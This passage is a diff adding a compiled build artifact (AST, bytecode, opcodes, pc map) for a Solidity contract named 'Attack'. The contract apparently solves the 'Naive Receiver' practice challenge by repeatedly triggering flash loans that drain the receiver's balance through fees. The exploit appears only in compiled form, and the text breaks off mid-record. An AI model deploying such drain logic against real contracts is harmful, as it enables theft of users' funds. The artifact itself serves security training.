+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    },
+                    "nodeType": "BinaryOperation",
+                    "operator": ">",
+                    "rightExpression": {
+                      "hexValue": "30",
+                      "id": 71,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": true,
+                      "kind": "number",
+                      "lValueRequested": false,
+                      "nodeType": "Literal",
+                      "src": "960:1:2",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_rational_0_by_1",
+                        "typeString": "int_const 0"
+                      },
+                      "value": "0"
+                    },
+                    "src": "956:5:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    }
+                  },
+                  "id": 92,
+                  "nodeType": "WhileStatement",
+                  "src": "949:170:2"
+                }
+              ]
+            },
+            "functionSelector": "61461954",
+            "id": 94,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "execute",
+            "nameLocation": "860:7:2",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 60,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "867:2:2"
+            },
+            "returnParameters": {
+              "id": 61,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "881:0:2"
+            },
+            "scope": 95,
+            "src": "851:274:2",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          }
+        ],
+        "scope": 96,
+        "src": "211:916:2",
+        "usedErrors": []
+      }
+    ],
+    "src": "32:1095:2"
+  },
+  "bytecode": "608060405234801561001057600080fd5b5061023a806100206000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c8063292bc63a146100675780633f7837e114610088578063485cc955146100b357806361461954146100f15780638e26d8b3146100f9578063908ed9351461010c575b600080fd5b6001546001600160a01b0316315b6040519081526020015b60405180910390f35b60005461009b906001600160a01b031681565b6040516001600160a01b03909116815260200161007f565b6100ef6100c13660046101d1565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169116179055565b005b6100ef61011e565b60015461009b906001600160a01b031681565b6000546001600160a01b031631610075565b6000546001600160a01b0316315b80156101b25760015460008054604051632767919760e21b81526001600160a01b039182166004820152602481019290925290911690639d9e465c90604401600060405180830381600087803b15801561018557600080fd5b505af1158015610199573d6000803e3d6000fd5b50506000546001600160a01b031631925061012c915050565b50565b80356001600160a01b03811681146101cc57600080fd5b919050565b600080604083850312156101e457600080fd5b6101ed836101b5565b91506101fb602084016101b5565b9050925092905056fea2646970667358221220d8adf244d505f5bdc4f26fb04baa68f4527dca8b45d00fb1ada613ae6cc045e564736f6c634300080c0033",
+  "bytecodeSha1": "036ef1ec5446d6e3c8ea73c537f43ea61e2eb25b",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.8.12+commit.f00d7308"
+  },
+  "contractName": "Attack",
+  "coverageMap": {
+    "branches": {
+      "1": {},
+      "2": {},
+      "3": {},
+      "4": {}
+    },
+    "statements": {
+      "1": {},
+      "2": {
+        "Attack.execute": {
+          "4": [
+            985,
+            1054
+          ],
+          "5": [
+            1068,
+            1108
+          ]
+        },
+        "Attack.initialize": {
+          "1": [
+            420,
+            476
+          ],
+          "2": [
+            486,
+            555
+          ]
+        },
+        "Attack.viewFlashLoanBalance": {
+          "3": [
+            643,
+            686
+          ]
+        },
+        "Attack.viewNaiveReceiverLenderPoolBalance": {
+          "0": [
+            788,
+            838
+          ]
+        }
+      },
+      "3": {},
+      "4": {}
+    }
+  },
+  "dependencies": [
+    "OpenZeppelin/openzeppelin-contracts@4.6.0/Address",
+    "FlashLoanReceiver",
+    "NaiveReceiverLenderPool"
+  ],
+  "deployedBytecode": "608060405234801561001057600080fd5b50600436106100625760003560e01c8063292bc63a146100675780633f7837e114610088578063485cc955146100b357806361461954146100f15780638e26d8b3146100f9578063908ed9351461010c575b600080fd5b6001546001600160a01b0316315b6040519081526020015b60405180910390f35b60005461009b906001600160a01b031681565b6040516001600160a01b03909116815260200161007f565b6100ef6100c13660046101d1565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169116179055565b005b6100ef61011e565b60015461009b906001600160a01b031681565b6000546001600160a01b031631610075565b6000546001600160a01b0316315b80156101b25760015460008054604051632767919760e21b81526001600160a01b039182166004820152602481019290925290911690639d9e465c90604401600060405180830381600087803b15801561018557600080fd5b505af1158015610199573d6000803e3d6000fd5b50506000546001600160a01b031631925061012c915050565b50565b80356001600160a01b03811681146101cc57600080fd5b919050565b600080604083850312156101e457600080fd5b6101ed836101b5565b91506101fb602084016101b5565b9050925092905056fea2646970667358221220d8adf244d505f5bdc4f26fb04baa68f4527dca8b45d00fb1ada613ae6cc045e564736f6c634300080c0033",
+  "deployedSourceMap": "211:916:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;699:146;803:26;;-1:-1:-1;;;;;803:26:2;795:43;699:146;;;160:25:5;;;148:2;133:18;699:146:2;;;;;;;;233:44;;;;;-1:-1:-1;;;;;233:44:2;;;;;;-1:-1:-1;;;;;393:32:5;;;375:51;;363:2;348:18;233:44:2;196:236:5;347:215:2;;;;;;:::i;:::-;420:19;:56;;-1:-1:-1;;;;;420:56:2;;;-1:-1:-1;;;;;;420:56:2;;;;;;;;486:69;;;;;;;;;;;347:215;;;851:274;;;:::i;283:57::-;;;;;-1:-1:-1;;;;;283:57:2;;;568:125;620:7;658:19;-1:-1:-1;;;;;658:19:2;650:36;568:125;;851:274;891:9;911:19;-1:-1:-1;;;;;911:19:2;903:36;949:170;956:5;;949:170;;985:26;;;1030:19;;985:69;;-1:-1:-1;;;985:69:2;;-1:-1:-1;;;;;1030:19:2;;;985:69;;;1309:51:5;1376:18;;;1369:34;;;;985:26:2;;;;:36;;1282:18:5;;985:69:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1080:19:2;;-1:-1:-1;;;;;1080:19:2;1072:36;;-1:-1:-1;949:170:2;;-1:-1:-1;;949:170:2;;881:244;851:274::o;437:173:5:-;505:20;;-1:-1:-1;;;;;554:31:5;;544:42;;534:70;;600:1;597;590:12;534:70;437:173;;;:::o;615:260::-;683:6;691;744:2;732:9;723:7;719:23;715:32;712:52;;;760:1;757;750:12;712:52;783:29;802:9;783:29;:::i;:::-;773:39;;831:38;865:2;854:9;850:18;831:38;:::i;:::-;821:48;;615:260;;;;;:::o",
+  "language": "Solidity",
+  "natspec": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "offset": [
+    211,
+    1127
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x62 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x292BC63A EQ PUSH2 0x67 JUMPI DUP1 PUSH4 0x3F7837E1 EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0x485CC955 EQ PUSH2 0xB3 JUMPI DUP1 PUSH4 0x61461954 EQ PUSH2 0xF1 JUMPI DUP1 PUSH4 0x8E26D8B3 EQ PUSH2 0xF9 JUMPI DUP1 PUSH4 0x908ED935 EQ PUSH2 0x10C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x9B SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x7F JUMP JUMPDEST PUSH2 0xEF PUSH2 0xC1 CALLDATASIZE PUSH1 0x4 PUSH2 0x1D1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x1 DUP1 SLOAD SWAP3 SWAP1 SWAP4 AND SWAP2 AND OR SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH2 0xEF PUSH2 0x11E JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH2 0x9B SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE PUSH2 0x75 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE JUMPDEST DUP1 ISZERO PUSH2 0x1B2 JUMPI PUSH1 0x1 SLOAD PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x27679197 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD SWAP3 SWAP1 SWAP3 MSTORE SWAP1 SWAP2 AND SWAP1 PUSH4 0x9D9E465C SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x185 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x199 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE SWAP3 POP PUSH2 0x12C SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x1CC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1E4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x1ED DUP4 PUSH2 0x1B5 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FB PUSH1 0x20 DUP5 ADD PUSH2 0x1B5 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD8 0xAD CALLCODE DIFFICULTY 0xD5 SDIV CREATE2 0xBD 0xC4 CALLCODE PUSH16 0xB04BAA68F4527DCA8B45D00FB1ADA613 0xAE PUSH13 0xC045E564736F6C634300080C00 CALLER ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "MSTORE",
+      "path": "2"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "CALLVALUE",
+      "path": "2"
+    },
+    "6": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "7": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "ISZERO",
+      "path": "2"
+    },
+    "8": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x10"
+    },
+    "11": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "12": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "14": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "15": {
+      "dev": "Cannot send ether to nonpayable function",
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "REVERT",
+      "path": "2"
+    },
+    "16": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "17": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "POP",
+      "path": "2"
+    },
+    "18": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x4"
+    },
+    "20": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "CALLDATASIZE",
+      "path": "2"
+    },
+    "21": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "LT",
+      "path": "2"
+    },
+    "22": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x62"
+    },
+    "25": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "26": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "28": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "CALLDATALOAD",
+      "path": "2"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0xE0"
+    },
+    "31": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "SHR",
+      "path": "2"
+    },
+    "32": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "33": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x292BC63A"
+    },
+    "38": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "EQ",
+      "path": "2"
+    },
+    "39": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x67"
+    },
+    "42": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "43": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "44": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x3F7837E1"
+    },
+    "49": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "EQ",
+      "path": "2"
+    },
+    "50": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x88"
+    },
+    "53": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "54": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "55": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x485CC955"
+    },
+    "60": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "EQ",
+      "path": "2"
+    },
+    "61": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0xB3"
+    },
+    "64": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "65": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "66": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x61461954"
+    },
+    "71": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "EQ",
+      "path": "2"
+    },
+    "72": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0xF1"
+    },
+    "75": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "76": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "77": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x8E26D8B3"
+    },
+    "82": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "EQ",
+      "path": "2"
+    },
+    "83": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0xF9"
+    },
+    "86": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "87": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "88": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x908ED935"
+    },
+    "93": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "EQ",
+      "path": "2"
+    },
+    "94": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x10C"
+    },
+    "97": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "98": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "99": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "101": {
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "102": {
+      "first_revert": true,
+      "fn": null,
+      "offset": [
+        211,
+        1127
+      ],
+      "op": "REVERT",
+      "path": "2"
+    },
+    "103": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "104": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        803,
+        829
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "statement": 0,
+      "value": "0x1"
+    },
+    "106": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        803,
+        829
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "107": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "109": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "111": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "113": {
+      "op": "SHL"
+    },
+    "114": {
+      "op": "SUB"
+    },
+    "115": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        803,
+        829
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "116": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        795,
+        838
+      ],
+      "op": "BALANCE",
+      "path": "2"
+    },
+    "117": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "118": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x40"
+    },
+    "120": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "MLOAD",
+      "path": "2"
+    },
+    "121": {
+      "op": "SWAP1"
+    },
+    "122": {
+      "op": "DUP2"
+    },
+    "123": {
+      "op": "MSTORE"
+    },
+    "124": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "126": {
+      "op": "ADD"
+    },
+    "127": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "128": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x40"
+    },
+    "130": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "MLOAD",
+      "path": "2"
+    },
+    "131": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "132": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "133": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "SUB",
+      "path": "2"
+    },
+    "134": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "135": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        699,
+        845
+      ],
+      "op": "RETURN",
+      "path": "2"
+    },
+    "136": {
+      "offset": [
+        233,
+        277
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "137": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "139": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "140": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x9B"
+    },
+    "143": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "144": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "146": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "148": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "150": {
+      "op": "SHL"
+    },
+    "151": {
+      "op": "SUB"
+    },
+    "152": {
+      "offset": [
+        233,
+        277
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "153": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "DUP2",
+      "path": "2"
+    },
+    "154": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "155": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "156": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x40"
+    },
+    "158": {
+      "fn": "Attack.viewNaiveReceiverLenderPoolBalance",
+      "offset": [
+        233,
+        277
+      ],
+      "op": "MLOAD",
+      "path": "2"
+    },
+    "159": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "161": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "163": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "165": {
+      "op": "SHL"
+    },
+    "166": {
+      "op": "SUB"
+    },
+    "167": {
+      "op": "SWAP1"
+    },
+    "168": {
+      "op": "SWAP2"
+    },
+    "169": {
+      "op": "AND"
+    },
+    "170": {
+      "op": "DUP2"
+    },
+    "171": {
+      "op": "MSTORE"
+    },
+    "172": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "174": {
+      "op": "ADD"
+    },
+    "175": {
+      "offset": [
+        233,
+        277
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x7F"
+    },
+    "178": {
+      "op": "JUMP"
+    },
+    "179": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "180": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0xEF"
+    },
+    "183": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0xC1"
+    },
+    "186": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "CALLDATASIZE",
+      "path": "2"
+    },
+    "187": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x4"
+    },
+    "189": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x1D1"
+    },
+    "192": {
+      "fn": "Attack.initialize",
+      "jump": "i",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "193": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "194": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        439
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "statement": 1,
+      "value": "0x0"
+    },
+    "196": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "197": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "198": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "200": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "202": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "204": {
+      "op": "SHL"
+    },
+    "205": {
+      "op": "SUB"
+    },
+    "206": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "SWAP4",
+      "path": "2"
+    },
+    "207": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "DUP5",
+      "path": "2"
+    },
+    "208": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "209": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "211": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "213": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "215": {
+      "op": "SHL"
+    },
+    "216": {
+      "op": "SUB"
+    },
+    "217": {
+      "op": "NOT"
+    },
+    "218": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "219": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "DUP3",
+      "path": "2"
+    },
+    "220": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "221": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "OR",
+      "path": "2"
+    },
+    "222": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "223": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "224": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "SSTORE",
+      "path": "2"
+    },
+    "225": {
+      "fn": "Attack.initialize",
+      "offset": [
+        420,
+        476
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x1"
+    },
+    "227": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "DUP1",
+      "path": "2",
+      "statement": 2
+    },
+    "228": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
